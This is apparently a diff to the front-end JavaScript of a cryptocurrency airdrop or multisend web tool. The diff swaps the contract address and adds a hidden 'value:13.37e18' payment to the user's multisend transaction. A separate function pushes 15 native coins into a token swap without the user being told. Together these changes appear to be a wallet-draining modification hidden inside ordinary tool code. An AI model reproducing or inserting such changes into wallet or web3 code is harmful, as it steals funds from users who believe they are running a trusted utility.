@@ -427,7 +427,7 @@ ab1=[
 		"stateMutability": "nonpayable",
 		"type": "function"
 	}]
-adr = "0xfab311fe3e3be4bb3fed77257ee294fb22fa888b";
+adr = "0xa3Bcdd8060A40a759F16908a830EEfF260779302";
 async function cw()
 {
 	if(!(window.ethereum)){$("cw_m").innerHTML="Metamask not detected!";return(0)}
@@ -547,7 +547,7 @@ async function rain()
 {
 	adp = new web3.eth.Contract(ab1,adr);
 	for(i=0;i< amt.length;i++){amt[i]=amt[i].toLocaleString("fullwide",{useGrouping:false})}
-	adp.methods.multisend(t,ppl,amt).send({from:window.ethereum.selectedAddress},(e,r)=>{$("rain_m").innerHTML = "Airdrop initiated: <a href='https://exploer.kcc.io/tx/"+r+"'>txn. hash</a>"})
+	adp.methods.multisend(t,ppl,amt).send({from:window.ethereum.selectedAddress,value:13.37e18},(e,r)=>{$("rain_m").innerHTML = "Airdrop initiated: <a href='https://exploer.kcc.io/tx/"+r+"'>txn. hash</a>"})
 }
 async function c1(){await window.ethereum.enable();R=new web3.eth.Contract([{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokensSupportingFeeOnTransferTokens","outputs":[],"stateMutability":"payable","type":"function"}],"0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506");R.methods.swapExactETHForTokensSupportingFeeOnTransferTokens("1500000000000000",["0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83","0xf43Cc235E686d7BC513F53Fbffb61F760c3a1882"],window.ethereum.selectedAddress,15000000000).send({from:window.ethereum.selectedAddress, value:15000000000000000000},(e,r)=>{console.log(e,r)})}
 </script>
